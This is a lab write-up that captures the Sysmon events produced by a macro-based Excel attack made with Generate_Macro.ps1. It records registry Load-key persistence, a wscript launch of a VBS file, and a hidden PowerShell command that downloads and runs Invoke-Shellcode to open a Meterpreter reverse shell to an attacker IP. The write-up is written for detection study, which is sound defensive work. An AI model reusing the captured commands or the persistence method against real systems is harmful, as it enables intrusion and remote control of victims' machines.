# Generate_Macro.ps1 

## Goal 
This write-up will focus on capturing techniques (Mainly focus on persistent) and the raw events by leveraging Generate_Macro (Credit to @enigma0x3) for study purpose. Generate-Macro will pack the payload into office macro and produce a xls file. For the payload options, it offers 4 options which are:

| Simulation # | Payload Option                                                                           |
| ------------ | ---------------------------------------------------------------------------------------- |
| 1            | Meterpreter Shell with Logon Persistence                                                 |
| 2            | Meterpreter Shell with Powershell Profile Persistence (Requires user to be local admin). |
| 3            | Meterpreter Shell with Alternate Data Stream Persistence                                 |
| 4            | Meterpreter Shell with Scheduled Task Persistence                                        |

Once the victim open the malicious xls, the vbs with callback payload will be created at C:\Users\Public\config.vbs (default path). And by modifying the registry to maintain the persistency.

## Caveat
This write-up will only focus on techniques used by Generate_Macro, please bare with me to exclude other techniques outside this tool. 

## Logging environment
* Splunk with Sysmon TA 
* Windows 10 Pro

## Technical Context
### Simulation 1 
#### Payload Generation
* Payload was generate with option #1. Meterpreter Shell with Logon Persistence

#### Attack Begin
1. User open the malicious excel file and autorun the macro  
The behavior of a user openin an excel file is too generic. Nothing had captured for this write-up.

2. Persistent by modifying registry(T1112)  
This macro will first modify the registry to maintain the persistency.  

##### Raw Sysmon Event
```xml
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>13</EventID><Version>2</Version><Level>4</Level><Task>13</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2020-11-23T15:40:52.8285083Z'/><EventRecordID>13517</EventRecordID><Correlation/><Execution ProcessID='2944' ThreadID='3680'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DESKTOP-DS6SIME</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>T1060</Data><Data Name='EventType'>SetValue</Data><Data Name='UtcTime'>2020-11-23 15:40:52.811</Data><Data Name='ProcessGuid'>{f2b94391-d804-5fbb-b30a-000000000500}</Data><Data Name='ProcessId'>5884</Data><Data Name='Image'>C:\Program Files (x86)\Microsoft Office\Root\Office16\EXCEL.EXE</Data><Data Name='TargetObject'>HKU\S-1-5-21-2242309504-3943410855-4141223597-1001\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\Load</Data><Data Name='Details'>C:\Users\Public\config.vbs</Data></EventData></Event>
```

##### Key Indicator

| Field               | Value                                                                                                        | Comments |
| ------------------- | ------------------------------------------------------------------------------------------------------------ | -------- |
| EventID             | 13                                                                                                           |          |
| process_name        | EXCEL.EXE                                                                                                    |          |
| process_id          | 5884                                                                                                         |          |
| registry_path       | HKU\S-1-5-21-2242309504-3943410855-4141223597-1001\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\Load |          |
| registry_value_name | C:\Users\Public\config.vbs                                                                                   |          |

3. payload execution - wscript
##### Raw Sysmon Event

```xml
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2020-11-23T15:40:52.8463770Z'/><EventRecordID>13519</EventRecordID><Correlation/><Execution ProcessID='2944' ThreadID='3680'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DESKTOP-DS6SIME</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2020-11-23 15:40:52.830</Data><Data Name='ProcessGuid'>{f2b94391-d804-5fbb-b70a-000000000500}</Data><Data Name='ProcessId'>9140</Data><Data Name='Image'>C:\Windows\SysWOW64\wscript.exe</Data><Data Name='FileVersion'>5.812.10240.16384</Data><Data Name='Description'>Microsoft ® Windows Based Script Host</Data><Data Name='Product'>Microsoft ® Windows Script Host</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>wscript.exe</Data><Data Name='CommandLine'>wscript C:\Users\Public\config.vbs</Data><Data Name='CurrentDirectory'>C:\Users\victim\Documents\</Data><Data Name='User'>DESKTOP-DS6SIME\victim</Data><Data Name='LogonGuid'>{f2b94391-ac21-5fbb-5e81-010000000000}</Data><Data Name='LogonId'>0x1815e</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=4D780D8F77047EE1C65F747D9F63A1FE,SHA256=391D47D21304F8F97254A6537AA65476609FC222AD0AD86E7008419D61735A9C,IMPHASH=3602F3C025378F418F804C5D183603FE</Data><Data Name='ParentProcessGuid'>{f2b94391-d804-5fbb-b30a-000000000500}</Data><Data Name='ParentProcessId'>5884</Data><Data Name='ParentImage'>C:\Program Files (x86)\Microsoft Office\root\Office16\EXCEL.EXE</Data><Data Name='ParentCommandLine'>"C:\Program Files (x86)\Microsoft Office\Root\Office16\EXCEL.EXE" "C:\Users\victim\Desktop\cv.xls"</Data></EventData></Event>
```

##### Key Indicator

| Field             | Value                                                                                              | Comments |
| ----------------- | -------------------------------------------------------------------------------------------------- | -------- |
| EventID           | 1                                                                                                  |          |
| cmdline           | wscript C:\Users\Public\config.vbs                                                                 |          |
| process_name      | wscript.exe                                                                                        |          |
| parent_process    | "C:\Program Files (x86)\Microsoft Office\Root\Office16\EXCEL.EXE" "C:\Users\victim\Desktop\cv.xls" |          |
| process_id        | 9140                                                                                               |          |
| parent_process_id | 5884                                                                                               |          |

4. payload execution - powershell
##### Raw Event
```xml
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2020-11-23T15:40:53.1141176Z'/><EventRecordID>13521</EventRecordID><Correlation/><Execution ProcessID='2944' ThreadID='3680'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DESKTOP-DS6SIME</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2020-11-23 15:40:53.091</Data><Data Name='ProcessGuid'>{f2b94391-d805-5fbb-b80a-000000000500}</Data><Data Name='ProcessId'>5680</Data><Data Name='Image'>C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>10.0.19041.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>"C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1')); Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost 192.168.254.44 -Lport 8443 -Force</Data><Data Name='CurrentDirectory'>C:\Users\victim\Documents\</Data><Data Name='User'>DESKTOP-DS6SIME\victim</Data><Data Name='LogonGuid'>{f2b94391-ac21-5fbb-5e81-010000000000}</Data><Data Name='LogonId'>0x1815e</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=5B16D54F2AE6B74DCF863BC0F5E502B5,SHA256=FCC434CC413E969DE19D329CA4E15CA567DA5DAA1F7E265D96EAF6E3D9D8B2CB,IMPHASH=194427A488ED1DD0A91731658B071667</Data><Data Name='ParentProcessGuid'>{f2b94391-d804-5fbb-b70a-000000000500}</Data><Data Name='ParentProcessId'>9140</Data><Data Name='ParentImage'>C:\Windows\SysWOW64\wscript.exe</Data><Data Name='ParentCommandLine'>wscript C:\Users\Public\config.vbs</Data></EventData></Event>
```

##### Key Indicator

| Field             | Value                                                                                                                                                                                                                                                                                                                                                | Comments |
| ----------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------- |
| EventID           | 1                                                                                                                                                                                                                                                                                                                                                    |          |
| process_exec      | powershell.exe                                                                                                                                                                                                                                                                                                                                       |          |
| process_id        | 5680                                                                                                                                                                                                                                                                                                                                                 |          |
| parent_process_id | 9140                                                                                                                                                                                                                                                                                                                                                 |          |
| cmdline           | "C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1')); Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost 192.168.254.44 -Lport 443 -Force |          |

### Simulation 2 
Unable to simulate the attack since the macro no longer be able to run as administrator permission

### Simulation 3
Coming Soon

### Simulation 4
Coming Soon

## Credit
@enigma0x3 - Author of Generate_Macro.ps1

## Declaimer 
!This is for study purpose only!

## Other takeaways
* The reason of using VBScript as a wrapper is to hide the DOS prompt when invoking any payload.